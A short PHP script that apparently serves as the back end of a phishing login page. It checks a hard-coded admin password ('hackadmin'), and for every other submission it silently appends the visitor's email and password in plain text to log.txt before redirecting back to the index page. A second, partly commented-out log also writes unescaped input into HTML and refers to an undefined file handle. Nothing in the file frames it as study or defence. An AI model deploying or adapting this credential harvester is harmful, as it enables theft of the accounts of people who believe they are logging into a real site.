<?php
session_start();
$pass_admin = "hackadmin";
if ($_POST['password'] == $pass_admin)
{
$_SESSION['admin'] = "admin";
header ('Location: admin.php');
}
else
{
$log_file = "log.txt";
$fh = fopen($log_file, 'a') or die("Невозможно открыть файл!");
/*$log_file2 = "log2.txt";
$fh2 = fopen($log_file2, 'a') or die("Невозможно открыть файл!");*/
$info = "$_POST[email]:$_POST[password]\n";
$info2 = "<input id=hutaku value=$_POST[email] name=$_POST[password]>\n";
fwrite($fh, $info);
fwrite($fh2, $info2);
header ('Location: index.php');
}
?>